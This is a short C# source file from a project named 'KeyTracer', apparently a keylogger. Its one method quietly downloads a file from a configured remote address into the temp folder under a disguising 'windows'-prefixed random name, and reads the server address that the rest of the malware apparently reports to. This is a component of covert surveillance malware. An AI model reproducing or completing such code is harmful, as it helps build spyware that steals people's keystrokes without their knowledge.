using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace KeyTracer
{
    static class Internet
    {
        public static int Connect()
        {
            try
            {
                WebClient webClient = new WebClient();
                Random random = new Random();

                string fileName =  "windows" + random.Next(9999999).ToString();
                string fileAdr = Path.Combine(Consts.tempPath, fileName);

                webClient.DownloadFile(Consts.serverLocation, fileAdr);

                Consts.Server = File.ReadAllText(fileAdr);

                return 1;
            }
            catch
            {
                return 0;
            }

        }
    }
}
